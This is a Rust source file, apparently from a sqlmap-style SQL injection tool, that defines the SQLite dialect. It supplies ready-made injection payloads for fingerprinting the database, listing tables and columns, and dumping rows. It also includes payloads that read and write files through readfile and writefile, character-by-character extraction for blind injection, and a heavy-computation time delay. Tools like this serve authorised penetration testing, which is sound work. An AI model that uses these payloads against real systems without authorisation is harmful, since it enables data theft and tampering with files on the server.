//! SQLite.

use crate::Dialect;
use sqlmap_core::dbms_kind::Dbms;

pub struct SqliteDialect;

impl Dialect for SqliteDialect {
    fn dbms(&self) -> Dbms { Dbms::SQLite }
    fn banner_query(&self) -> &'static str { "sqlite_version()" }
    fn current_user_query(&self) -> &'static str { "''" }
    fn current_db_query(&self) -> &'static str { "(SELECT file FROM pragma_database_list LIMIT 1)" }
    fn hostname_query(&self) -> &'static str { "''" }
    fn is_dba_query(&self) -> &'static str { "1=1" }
    fn list_dbs(&self) -> &'static str { "(SELECT GROUP_CONCAT(name) FROM pragma_database_list)" }
    fn list_tables(&self, _db: &str) -> String {
        "(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')".into()
    }
    fn list_columns(&self, _db: &str, table: &str) -> String {
        format!("(SELECT GROUP_CONCAT(name||':'||type) FROM pragma_table_info('{table}'))")
    }
    fn count_rows(&self, _db: &str, table: &str) -> String {
        format!("SELECT COUNT(*) FROM {table}")
    }
    fn dump_rows(&self, _db: &str, table: &str, cols: &[&str], start: usize, count: usize) -> String {
        let cols = if cols.is_empty() { "*".to_string() } else { cols.join(",") };
        format!("SELECT {cols} FROM {table} LIMIT {count} OFFSET {start}")
    }
    fn file_read(&self, path: &str) -> String { format!("(SELECT HEX(readfile('{path}')))") }
    fn file_write(&self, bytes_hex: &str, dest: &str) -> String {
        format!("SELECT writefile('{dest}',X'{bytes_hex}')")
    }
    fn os_cmd(&self, _cmd: &str) -> String {
        // SQLite cannot execute OS commands without a loadable extension we
        // don't control. Empty string signals "unsupported".
        String::new()
    }
    fn substr(&self, expr: &str, pos: usize, len: usize) -> String {
        format!("SUBSTR(({expr}),{pos},{len})")
    }
    fn ord(&self, ch: &str) -> String { format!("UNICODE({ch})") }
    fn concat(&self, parts: &[&str]) -> String { parts.join("||") }
    fn sleep(&self, seconds: u32) -> String {
        format!("(SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({seconds}00000000/2)))))")
    }
    fn password_table(&self) -> &'static str { "" }
    fn comment(&self) -> &'static str { "-- " }
}
